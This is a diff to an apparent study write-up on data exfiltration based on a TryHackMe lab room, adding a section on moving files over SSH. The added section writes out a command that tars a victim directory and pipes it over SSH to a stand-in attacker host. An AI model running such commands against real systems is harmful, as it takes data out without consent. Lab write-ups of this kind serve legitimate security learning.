@@ -18,7 +18,7 @@ Here we will use some techniques below to exemplify data theft;
 
 For this study, we used the **TryHackMe** room as an example ([TryHackMe - Data Exfiltration ](https://tryhackme.com/r/room/dataxexfilt)).
 
-## TCP Socket
+## TCP Socket Protocol
 
 In this topic, we will use the TCP protocol to transfer data from an already compressed host. This is the simplest technique, where we know that there is a weak security system.
 
@@ -31,8 +31,6 @@ In this topic, we will use the TCP protocol to transfer data from an already com
 3. The victim communicates with the hacker and begins transferring data.
 
 ### Starting the Attack
-
-
 
 * Let's use NC (NetCat) to start a listener on the attacker. In this step, we will transfer all data received on port 1337 to the **data.txt** file.
 
@@ -63,4 +61,33 @@ Below we can see the sending and receiving of data via TCP socket.
   <img width="800" height="300" src="./img/5.jpg">
 </p>
 
-## SSH
+## SSH Protocol
+
+In this step, we will use the SSH protocol to exfiltrate data. More secure than TCP, SSH uses a layer of encryption, making it difficult for security tools to identify leaks.
+
+<p align="center">
+  <img width="800" height="200" src="./img/6.jpg">
+</p>
+
+* We will use a technique similar to the TCP socket, sending the data encoded.
+
+```
+tar cf - /tmp/files/ | ssh thm@attacker.ip "cd /tmp/; tar xpf -"
+```
+1. Use TAR to create a directory archive.
+2. We concatenate it with the SSH command sent to our attacker's user/ip.
+3. Inside the attacker's host, we change the directory to /tmp/ and unzip the TAR.
+
+Below we can see the victim's host transferring via SSH to the attacker.
+
+<p align="center">
+  <img width="800" height="200" src="./img/7.jpg">
+</p>
+
+We found the files inside the attacker's machine.
+
+<p align="center">
+  <img width="800" height="200" src="./img/8.jpg">
+</p>
+
+## ICMP Protocol
